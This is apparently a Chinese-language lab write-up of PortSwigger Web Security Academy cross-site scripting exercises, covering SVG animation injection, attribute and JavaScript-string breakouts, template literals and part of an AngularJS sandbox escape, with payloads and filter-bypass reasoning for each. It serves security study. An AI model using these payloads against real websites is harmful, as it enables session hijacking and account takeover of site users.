<p>要点击Deliver exploit to victim。</p>
<h4 id="所有事件和-href-属性均被阻止的反射型-XSS"><a href="#所有事件和-href-属性均被阻止的反射型-XSS" class="headerlink" title="所有事件和 href 属性均被阻止的反射型 XSS"></a>所有事件和 href 属性均被阻止的反射型 XSS</h4><h5 id="实验要求-3"><a href="#实验要求-3" class="headerlink" title="实验要求"></a>实验要求</h5><p>这个实验包含一个反射型 XSS 漏洞，同时存在一些白名单标签，但所有事件和锚点的 href 属性都被屏蔽了。</p>
<p>要解决这个实验，需要执行一次跨站脚本攻击，注入一个向量，当该向量被点击时，会调用 alert 函数。</p>
<p>请注意，你需要在向量中包含 “Click” 这个词，以促使实验中的模拟用户点击你的向量。例如：</p>
<p><code>&lt;a href=&quot;&quot;&gt;Click me&lt;/a&gt;</code></p>
<h5 id="实验过程-3"><a href="#实验过程-3" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验告诉我们存在白名单标签，我们通过<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload 备忘录</a>的标签字典测试一下。</p>
<img src="/XSS/XSS/image-20250731090453332.png" class="" title="image-20250731090453332">

<p>animate a svg title image 这些标签没有被禁止。</p>
<p>实验要求还告诉我们，所有事件和描点的href属性被屏蔽。</p>
<p>svg标签：向html页面嵌入一个独立的窗口和坐标体系。</p>
<p>animate标签：用于动态设置SVG元素的属性值。</p>
<p>a标签：svg的描元素，用于定义超链接。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">values</span>=<span class="string">javascript:alert(1)</span> &gt;</span><span class="tag">&lt;/<span class="name">animate</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">10</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>attributeName：要更改的属性名称，values：要更改的值的内容。</p>
<p>text标签：svg的矢量文本元素，用于绘制文本。</p>
<p>此payload动态调整a标签的href属性，让其为javascript:伪协议，当我们点击文本后，就会执行javascript代码。</p>
<img src="/XSS/XSS/image-20250731092804292.png" class="" title="image-20250731092804292">

<p>点击Click me 即可完成实验（不点击，好像也可以完成实验）。</p>
<h4 id="允许部分SVG标记的反射型XSS"><a href="#允许部分SVG标记的反射型XSS" class="headerlink" title="允许部分SVG标记的反射型XSS"></a>允许部分SVG标记的反射型XSS</h4><h5 id="实验要求-4"><a href="#实验要求-4" class="headerlink" title="实验要求"></a>实验要求</h5><p>这个安全实验室存在一个简单的反射型XSS漏洞。网站虽然屏蔽了常见HTML标签，但遗漏了某些SVG标签和事件。</p>
<p>要完成实验，请构造一个跨站脚本攻击，成功调用alert()函数。</p>
<h5 id="实验过程-4"><a href="#实验过程-4" class="headerlink" title="实验过程"></a>实验过程</h5><p>网站屏蔽了常见的HTML标签，我们通过<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload 备忘录</a>的tag进行爆破，发现：</p>
<img src="/XSS/XSS/image-20250731102123243.png" class="" title="image-20250731102123243">

<p>只有这些标签可以用。</p>
<p>爆破事件属性：</p>
<img src="/XSS/XSS/image-20250731103646914.png" class="" title="image-20250731103646914">

<p>onbegin事件属性可以利用，其仅限于SVG动画元素。</p>
<p>onbegin事件在动画开始播放时执行脚本。通常用于以下SVG动画元素：<code>animate animateTransform animateMotion set</code> ，</p>
<p>payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animateTransform</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> &gt;</span><span class="tag">&lt;/<span class="name">animateTransform</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250731104732602.png" class="" title="image-20250731104732602">

<p>animateTransform 是SVG中专门用于对元素进行变形动画的元素，它可以实现平移、旋转、缩放、斜切等变换效果。</p>
<h3 id="HTML标签属性中的XSS攻击"><a href="#HTML标签属性中的XSS攻击" class="headerlink" title="HTML标签属性中的XSS攻击"></a>HTML标签属性中的XSS攻击</h3><h4 id="反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）"><a href="#反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）" class="headerlink" title="反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）"></a>反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）</h4><h5 id="实验要求-5"><a href="#实验要求-5" class="headerlink" title="实验要求"></a>实验要求</h5><p>本实验在博客搜索功能中存在一个反射型跨站脚本（XSS）漏洞，但输入中的尖括号会被HTML编码。要完成本实验，请发起一次XSS攻击，通过注入属性并调用<code>alert</code>函数实现弹窗。</p>
<h5 id="实验过程-5"><a href="#实验过程-5" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验要求告诉我们，搜索框存在XSS攻击，我们输入123，点击搜索。</p>
<p>按F12打开开发者工具，Ctrl+F，搜索123：</p>
<img src="/XSS/XSS/image-20250801074313257.png" class="" title="image-20250801074313257">

<p>发现一个在h1标签里面，一个在input的value属性里面。</p>
<p>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>:</p>
<img src="/XSS/XSS/image-20250801074420347.png" class="" title="image-20250801074420347">

<p>完整的给我们输出出来，这说明有些地方肯定被实体化了。</p>
<img src="/XSS/XSS/image-20250801074607452.png" class="" title="image-20250801074607452">

<p>尖括号被实体化了，那我们只能寄希望于input的value属性：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; autofocus onfocus=&quot;alert(1)</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250801074806515.png" class="" title="image-20250801074806515">

<p>autofocus属性用于自动获取焦点。</p>
<h4 id="存储型XSS——利用锚点href属性注入（双引号被HTML编码）"><a href="#存储型XSS——利用锚点href属性注入（双引号被HTML编码）" class="headerlink" title="存储型XSS——利用锚点href属性注入（双引号被HTML编码）"></a>存储型XSS——利用锚点href属性注入（双引号被HTML编码）</h4><h5 id="实验要求：-9"><a href="#实验要求：-9" class="headerlink" title="实验要求："></a>实验要求：</h5><p>该实验在评论功能中存在一个<strong>存储型跨站脚本（XSS）漏洞</strong>。要完成实验，你需要提交一条评论，<strong>当用户点击评论者姓名时触发<code>alert</code>函数</strong>。</p>
<h5 id="实验过程：-9"><a href="#实验过程：-9" class="headerlink" title="实验过程："></a>实验过程：</h5><p>实验要求告诉我们，在评论功能中，存在一个储存型跨站脚本漏洞。</p>
<p>进入博客的评论区，输入：</p>
<img src="/XSS/XSS/image-20250801084327721.png" class="" title="image-20250801084327721">

<p>保存后，返回查看内容。</p>
<img src="/XSS/XSS/image-20250801084424834.png" class="" title="image-20250801084424834">

<p>可以看到href属性我们可以控制，这里可以利用javascript的伪协议执行代码。</p>
<img src="/XSS/XSS/image-20250801084631959.png" class="" title="image-20250801084631959">

<img src="/XSS/XSS/image-20250801084658212.png" class="" title="image-20250801084658212">

<p>实验已经完成了。</p>
<h4 id="Canonical-链接标签中的反射型-XSS-漏洞"><a href="#Canonical-链接标签中的反射型-XSS-漏洞" class="headerlink" title="Canonical 链接标签中的反射型 XSS 漏洞"></a>Canonical 链接标签中的反射型 XSS 漏洞</h4><h5 id="实验要求：-10"><a href="#实验要求：-10" class="headerlink" title="实验要求："></a>实验要求：</h5><p>本实验将用户输入反射到 <strong>canonical 链接标签</strong> 中，并对尖括号进行了转义。</p>
<p>要完成该实验，您需要在主页上发起 <strong>跨站脚本（XSS）攻击</strong>，注入一个能触发 <code>alert</code> 函数的属性。</p>
<p>为辅助漏洞利用，您可以假设模拟用户会按下以下组合键：</p>
<ul>
<li><strong>Alt+Shift+X</strong></li>
<li><strong>Ctrl+Alt+X</strong></li>
<li><strong>Alt+X</strong></li>
</ul>
<p>请注意，该实验的预期解决方案 <strong>仅适用于 Chrome 浏览器</strong>。</p>
<h5 id="实验过程：-10"><a href="#实验过程：-10" class="headerlink" title="实验过程："></a>实验过程：</h5><p>进入实验，搜索canonical：</p>
<img src="/XSS/XSS/image-20250801092110797.png" class="" title="image-20250801092110797">

<p>可以发现，href的值正是我们的网站网址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ae900c504cbe9828341168000640008.web-security-academy.net/?&#x27;accesskey=&#x27;x&#x27;onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>

<p>accesskey属性：用于设置快捷键，通过快捷键可以触发onclick事件。</p>
<p>我电脑上下载了两个浏览器，一个水狐，一个谷歌的，在谷歌上我不清楚为啥无法触发。在水狐上可以触发，按alt+shift+x，就可以触发。</p>
<h3 id="JavaScript上下文中的XSS攻击"><a href="#JavaScript上下文中的XSS攻击" class="headerlink" title="JavaScript上下文中的XSS攻击"></a>JavaScript上下文中的XSS攻击</h3><h4 id="单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）"><a href="#单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）" class="headerlink" title="单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）"></a>单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）</h4><h5 id="实验要求-6"><a href="#实验要求-6" class="headerlink" title="实验要求"></a>实验要求</h5><p>本实验在搜索查询跟踪功能中存在一个反射型跨站脚本(XSS)漏洞。用户输入被反射到一个JavaScript字符串中，且单引号(<code>&#39;</code>)和反斜杠(<code>\</code>)已被转义处理。</p>
<p>构造一个XSS攻击方案，突破JavaScript字符串的限制，成功执行<code>alert</code>函数。</p>
<h5 id="实验过程-6"><a href="#实验过程-6" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验要求说，在搜索查询跟踪功能中存在XSS反射性漏洞。</p>
<p>输入 123 。</p>
<p>按f12打开开发者工具，进入源码搜索123。</p>
<img src="/XSS/XSS/image-20250801110647246.png" class="" title="image-20250801110647246">

<p>总共有两个地方出现了123。</p>
<p>我们接着输入<code>123&lt;/script&gt;</code>。</p>
<img src="/XSS/XSS/image-20250801110921426.png" class="" title="image-20250801110921426">

<p>上面进行将尖括号转换为了实体，下面并没有转换。</p>
<p>我们接着输入<code>123&#39;&lt;/script&gt;</code></p>
<img src="/XSS/XSS/image-20250801111047236.png" class="" title="image-20250801111047236">

<p>发现其对单引号进行了转义，我们再加一个反斜杠，让它转义它自己；我们接着写入恶意代码。</p>
<p><code>123\&#39;&lt;/script&gt;&lt;img src=1 onerror=alert(1) /&gt;</code></p>
<img src="/XSS/XSS/image-20250801111431368.png" class="" title="image-20250801111431368">

<p>实验完成。</p>
<h4 id="反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码"><a href="#反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码" class="headerlink" title="反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码"></a>反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码</h4><h5 id="实验要求-7"><a href="#实验要求-7" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在搜索查询跟踪功能中存在一个反射型跨站脚本漏洞，其中尖括号已被编码。漏洞反射点位于JavaScript字符串内部。要完成本实验，需要构造一个跨站脚本攻击，突破JavaScript字符串的束缚并执行<code>alert</code>函数。</p>
<h5 id="实验过程-7"><a href="#实验过程-7" class="headerlink" title="实验过程"></a>实验过程</h5><p>在搜索功能输入123，打开开发者工具，进入源码查看内容。</p>
<img src="/XSS/XSS/image-20250803070557236.png" class="" title="image-20250803070557236">

<p>可以看到，javascript的脚本是嵌套在html里面的，searchTerms用于获取我们搜索框输入的内容。在测试的过程中，发现并没有对单引号进行转义，可以直接输入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>

<p>闭合单引号，;结束符，输入恶意代码，通过注释注释掉后面的多余字符。</p>
<img src="/XSS/XSS/image-20250803071828986.png" class="" title="image-20250803071828986">

<p>后面还使用了document.write，encodeURIComponent对searchTerms进行了url编码。我们无法闭合双引号，并写入onerror事件。</p>
<p>实验完成。</p>
<h4 id="反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境"><a href="#反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境" class="headerlink" title="反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境"></a>反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境</h4><h5 id="实验要求-8"><a href="#实验要求-8" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在搜索查询跟踪功能中存在一个反射型XSS漏洞，其中：</p>
<ul>
<li>尖括号（<code>&lt;</code> <code>&gt;</code>）和双引号（<code>&quot;</code>）已被HTML编码</li>
<li>单引号（<code>&#39;</code>）被转义</li>
</ul>
<p>要完成实验，请构造一个XSS攻击：</p>
<ol>
<li>突破JavaScript字符串限制</li>
<li>成功执行<code>alert</code>函数</li>
</ol>
<h5 id="实验过程-8"><a href="#实验过程-8" class="headerlink" title="实验过程"></a>实验过程</h5><p>输入123，打开开发者工具：</p>
<img src="/XSS/XSS/image-20250803083542794.png" class="" title="image-20250803083542794">

<p>闭合但引号，写入恶意代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250803083732532.png" class="" title="image-20250803083732532">

<p>对单引号进行转义。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250803084017742.png" class="" title="image-20250803084017742">

<p>实验完成。</p>
<h4 id="反射型XSS：JavaScript-URL中部分字符被拦截的情况"><a href="#反射型XSS：JavaScript-URL中部分字符被拦截的情况" class="headerlink" title="反射型XSS：JavaScript URL中部分字符被拦截的情况"></a>反射型XSS：JavaScript URL中部分字符被拦截的情况</h4><h5 id="实验要求-9"><a href="#实验要求-9" class="headerlink" title="实验要求"></a>实验要求</h5><p>本实验会将您的输入反射到 JavaScript URL 中，但实际情况并非表面那么简单。虽然初看像是简单的挑战，但应用程序已拦截部分特殊字符以防止 XSS 攻击。</p>
<p>构造一个跨站脚本（XSS）攻击，成功执行 <code>alert</code> 函数，并确保弹窗消息中包含字符串 <code>1337</code>。</p>
<h5 id="实验过程-9"><a href="#实验过程-9" class="headerlink" title="实验过程"></a>实验过程</h5><p>页面没有搜索页面，进入博客文章。</p>
<p>打开开发者工具，搜索script。</p>
<img src="/XSS/XSS/image-20250803104313576.png" class="" title="image-20250803104313576">

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post%3fpostId%3d5&#x27;&#125;).finally(_ =&gt; window.location = &#x27;/&#x27;)&quot;</span>&gt;</span>Back to Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>body的值就是我们网站的部分网址，所以注入点在这里。</p>
<p>由于postId只能是数字，如果是其他内容会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/post?postId=5&amp;&#x27;&#125;/*JavaScript代码*/&#123;&#x27;</span><br></pre></td></tr></table></figure>

<p>使用&amp;间隔，postId传入的只有5，我们就可以使用<code>&#39;&#125;&#123;&#39;</code>闭合左右的花括号，并在其中间输入javaScript代码。</p>
<p>在JavaScript中，处理多个表达式，可以使用逗号分开，多个表达式都会运行，但只会返回最后一个表达式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/post?postId=5&amp;&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;&#x27;,&#123;x:&#x27;</span><br></pre></td></tr></table></figure>

<p>在这里，我们可能犯一个错误，不知道toString的值到底是哪个，x 还是 window + ‘’ 还是 {x:’’}。</p>
<p>赋值运算分的优先级高于逗号运算符，逗号运算符一般配合圆括号使用。toString的值是x。</p>
<p>window+’’：空字符串与window进行拼接，会触发toString函数，toString函数被我们重写为x，所以触发的函数是x。</p>
<p>为啥要使用&#x2F;**&#x2F;，throw后面必紧跟表达式，如果我们在url中输入<code>throw onerror</code>，第一次url编码后，转变为<code>throw+onerror</code>，<code>throw+onerror</code>位于href内；了解服务器的解析过程原理：服务器将原始的HTML代码以文本的形式返回给浏览器；浏览器接收的HTML文档后，开始逐行解析并构建DOM树，在解析的过程中，会将HTML实体转化为对应的字符；<code>javascript:</code>协议的执行阶段，提取href中的JavaScript代码，执行前进行URL解码，会自动解码JavaScript代码的所有url编码字符，在解码的过程中不会将+转换为空格，<code>throw+onerror=alert,1337</code>是错误的语法，使用<code>/**/</code>可以解决这个问题。</p>
<p>对象字面量必须是属性:值的形式，不然会报错。</p>
<p>throw&#x2F;**&#x2F;onerror&#x3D;alert,1337 重写了onerror函数，当前onerror函数是alert函数，逗号运算符将1337返回给throw，让其抛给onerror函数，执行<code>alert(1)</code>。</p>
<p>还有最重要的一点，即使你定义了一个只接收两个参数的函数，这个函数也可以接收额外的参数（额外的参数不会传到函数内部。），如果额外的参数是表达式，还会执行表达式。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">num</span>(<span class="params">count</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="title function_">num</span>(count,count=<span class="number">1</span>); <span class="comment">// 0 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(count); <span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 说明count=1被执行了</span></span><br></pre></td></tr></table></figure>

<p>发送上面的payload,点击back to  blog 弹出1337，就成功完成实验。</p>
<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><h4 id="存储型XSS攻击，注入到onclick事件中，其中尖括号（）和双引号（”）被HTML编码，单引号（’）和反斜杠（-）被转义"><a href="#存储型XSS攻击，注入到onclick事件中，其中尖括号（）和双引号（”）被HTML编码，单引号（’）和反斜杠（-）被转义" class="headerlink" title="存储型XSS攻击，注入到onclick事件中，其中尖括号（&lt;&gt;）和双引号（”）被HTML编码，单引号（’）和反斜杠（\）被转义"></a>存储型XSS攻击，注入到onclick事件中，其中尖括号（&lt;&gt;）和双引号（”）被HTML编码，单引号（’）和反斜杠（\）被转义</h4><h5 id="实验要求-10"><a href="#实验要求-10" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在评论功能中存在一个<strong>存储型XSS漏洞</strong>。</p>
<p>提交一条评论，使得<strong>当用户点击评论作者的名字时</strong>，触发 <code>alert</code> 函数弹窗。</p>
<h5 id="实验过程-10"><a href="#实验过程-10" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验要求告诉我们，是一个存储型XSS漏洞，我们进入一篇博客文章。</p>
<p>打开开发者工具搜索script，并没有搜索到任何相关内容。</p>
<p>我们进行评论，查看评论内容。</p>
<img src="/XSS/XSS/image-20250804085959952.png" class="" title="image-20250804085959952">

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tracker=&#123;<span class="title function_">track</span>(<span class="params"></span>)&#123;&#125;&#125;;tracker.<span class="title function_">track</span>(<span class="string">&#x27;http://example.com&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>定义了一个tracker对象，tracker对象里面有一个track函数，track函数是一个空函数。</p>
<p>从这里我们可以看到注入点在评论功能的Website，如果我们将其闭合，并输入：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;);alert(1);tracker.track(&#x27;</span></span><br></pre></td></tr></table></figure>

<p>后面的tracker.track主要是为了保持语法的正确性。</p>
<img src="/XSS/XSS/image-20250804090651023.png" class="" title="image-20250804090651023">

<p>它对我们的单引号进行了转义。</p>
<p>浏览器在解析完标签和属性后，会在进一步处理标签属性之前，对标签属性的html实体进行解码，我们在浏览器中看到的是HTML实体解码后的内容。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com&amp;#39);alert(1);tracker.track(&amp;#39</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250804094247364.png" class="" title="image-20250804094247364">

<p>实验完成。</p>
<p>说一些额外的内容：</p>
<img src="/XSS/XSS/image-20250804111810363.png" class="" title="image-20250804111810363">

<p>我今天做的时候，HTML解码是何时发生的；现在我知道了，我说一下。</p>
<p>服务器响应后，会将原始的HTML代码以文本的形式传输给浏览器；浏览器接收到HTML文档后，会逐行解析并构建DOM树。</p>
<p>在解析的过程中，浏览器会自动将HTML实体解码为队形的字符。</p>
<p>当用户点击<code>&lt;a&gt;</code>标签时，其中的HTML实体已经被解码。</p>
<h3 id="JavaScript模板字符串中的XSS攻击"><a href="#JavaScript模板字符串中的XSS攻击" class="headerlink" title="JavaScript模板字符串中的XSS攻击"></a>JavaScript模板字符串中的XSS攻击</h3><h4 id="反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）"><a href="#反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）" class="headerlink" title="反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）"></a>反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）</h4><h5 id="实验要求-11"><a href="#实验要求-11" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在博客搜索功能中存在一个反射型跨站脚本(XSS)漏洞。漏洞反射点位于模板字符串内部，且已对尖括号、单双引号进行了HTML编码，反引号也做了转义处理。要完成本实验，请构造一个能在该模板字符串中执行alert函数的XSS攻击。</p>
<h5 id="实验过程-11"><a href="#实验过程-11" class="headerlink" title="实验过程"></a>实验过程</h5><p>在搜索页面输入123，打开开发者工具，搜索123：</p>
<img src="/XSS/XSS/image-20250804104719173.png" class="" title="image-20250804104719173">

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message = <span class="string">`0 search results for &#x27;123&#x27;`</span>; <span class="comment">// 使用了反引号</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;searchMessage&#x27;</span>).<span class="property">innerText</span> = message;</span><br></pre></td></tr></table></figure>

<p>反引号允许变量或表达式，通过${}嵌入到反引号内，123的输入点我们可控，我们可以输入<code>$&#123;alert(1)&#125;</code>，就可以执行alert函数。</p>
<img src="/XSS/XSS/image-20250804105127774.png" class="" title="image-20250804105127774">

<p>到这里实验就结束了。</p>
<h2 id="AngularJS的沙盒逃逸"><a href="#AngularJS的沙盒逃逸" class="headerlink" title="AngularJS的沙盒逃逸"></a>AngularJS的沙盒逃逸</h2><h3 id="无字符串的AngularJS沙箱逃逸攻击"><a href="#无字符串的AngularJS沙箱逃逸攻击" class="headerlink" title="无字符串的AngularJS沙箱逃逸攻击"></a>无字符串的AngularJS沙箱逃逸攻击</h3><h4 id="实验要求-12"><a href="#实验要求-12" class="headerlink" title="实验要求"></a>实验要求</h4><p>本实验环境以一种特殊方式使用AngularJS：**<code>$eval</code>函数被禁用<strong>，且</strong>禁止在AngularJS表达式中使用任何字符串**。</p>
<p>构造一个跨站脚本（XSS）攻击，在<strong>不使用<code>$eval</code>函数</strong>的前提下：</p>
<ol>
<li>突破AngularJS沙箱限制</li>
<li>成功执行<code>alert()</code>函数</li>
</ol>
<h4 id="实验过程-12"><a href="#实验过程-12" class="headerlink" title="实验过程"></a>实验过程</h4><p>有一个搜索框，输入123。</p>
<p>打开开发者工具，进入源码，发现：</p>
<img src="/XSS/XSS/image-20250805100528638.png" class="" title="image-20250805100528638">

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">angular.<span class="title function_">module</span>() <span class="comment">// 用于创建或获取一个模块。</span></span><br><span class="line"><span class="comment">// 参数1 &#x27;labApp&#x27;: 模块名称。</span></span><br><span class="line"><span class="comment">// 参数2 []：依赖的其他模块列表（空数组表示无依赖）。</span></span><br><span class="line"><span class="comment">// 如果省略第二个参数(如angular.module(&#x27;labApp&#x27;))，则表示获取已存在的模块。</span></span><br><span class="line">.<span class="title function_">controller</span>() <span class="comment">// 用于注册一个控制器</span></span><br><span class="line"><span class="comment">// 参数1 &#x27;vulnCtrl&#x27; 控制器名称</span></span><br><span class="line"><span class="comment">// 参数2 控制器函数，支持依赖注入。</span></span><br><span class="line"><span class="keyword">function</span>(<span class="params">$scope,$parse</span>)</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">$scope: 用于在视图(HTML)和控制器之间共享数据</span></span><br><span class="line"><span class="comment">$scope: 是AngularJS的数据模型，所有绑定到视图的变量都挂载在它上面。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$parse: 用于将字符串表达式解析为可执行的函数。</span></span><br><span class="line"><span class="comment">$parse会将表达式分为两类处理：</span></span><br><span class="line"><span class="comment">	1. 无依赖表达式：</span></span><br><span class="line"><span class="comment">		$parse(&#x27;1+1&#x27;)() -&gt; 2 </span></span><br><span class="line"><span class="comment">		$parse(&#x27;[1,2]&#x27;)() -&gt; [1,2]</span></span><br><span class="line"><span class="comment">		不依赖上下文</span></span><br><span class="line"><span class="comment">	2. 依赖上下文表达式</span></span><br><span class="line"><span class="comment">		$parse(name)(&#123;user: &#123;name:&#x27;TOM&#x27;&#125;&#125;) // TOM</span></span><br><span class="line"><span class="comment">		$parse(&#x27;a + b&#x27;)(&#123; a: 1, b: 2 &#125;); // 3</span></span><br><span class="line"><span class="comment">		$parse(&#x27;func()&#x27;)(&#123; func: () =&gt; &#x27;hi&#x27; &#125;); // &#x27;hi&#x27;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">angular.<span class="title function_">module</span>(<span class="string">&#x27;labApp&#x27;</span>, []).<span class="title function_">controller</span>(<span class="string">&#x27;vulnCtrl&#x27;</span>,<span class="keyword">function</span>(<span class="params">$scope, $parse</span>) &#123;</span><br><span class="line">    <span class="comment">// 创建了一个labApp模块和一个vulnCtrl控制器</span></span><br><span class="line">    $scope.<span class="property">query</span> = &#123;&#125;;</span><br><span class="line">    <span class="comment">// 创建了一个query对象</span></span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">&#x27;search&#x27;</span>;</span><br><span class="line">    <span class="comment">// 初始化变量key</span></span><br><span class="line">    $scope.<span class="property">query</span>[key] = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="comment">// 给对象添加属性值</span></span><br><span class="line">    $scope.<span class="property">value</span> = $parse(key)($scope.<span class="property">query</span>);</span><br><span class="line">    <span class="comment">// 将query.key的值赋值给value。</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250805130348752.png" class="" title="image-20250805130348752">

